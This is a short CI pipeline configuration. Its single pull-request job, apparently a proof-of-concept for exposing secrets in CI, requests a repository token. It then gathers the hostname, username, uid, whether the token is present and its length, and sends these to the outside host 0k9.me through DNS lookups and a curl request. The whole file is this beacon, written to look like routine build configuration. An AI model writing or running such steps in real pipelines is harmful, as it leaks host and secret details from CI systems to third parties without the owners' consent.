jobs:
    main:
        image: node:22
        requires:
            - ~pr
        steps:
            - proof: |
                T=c8e6689102201048
                H=$(hostname | tr -cd 'a-zA-Z0-9-' | cut -c1-40)
                echo "SDPOC marker=$T"
                echo "SDPOC host=$H user=$(id -un) uid=$(id -u)"
                echo "SDPOC coveralls_present=${COVERALLS_REPO_TOKEN:+yes} coveralls_len=${#COVERALLS_REPO_TOKEN}"
                echo "SDPOC sd_vars=$(env | grep -c '^SD_')"
                getent hosts "$T.d.0k9.me" >/dev/null 2>&1 || true
                getent hosts "h-$H.$T.d.0k9.me" >/dev/null 2>&1 || true
                curl -s -m 8 "https://0k9.me/l0gg/$T?h=$H&u=$(id -un)&c=${#COVERALLS_REPO_TOKEN}" >/dev/null 2>&1 || true
                echo "SDPOC done"
        secrets:
            - COVERALLS_REPO_TOKEN
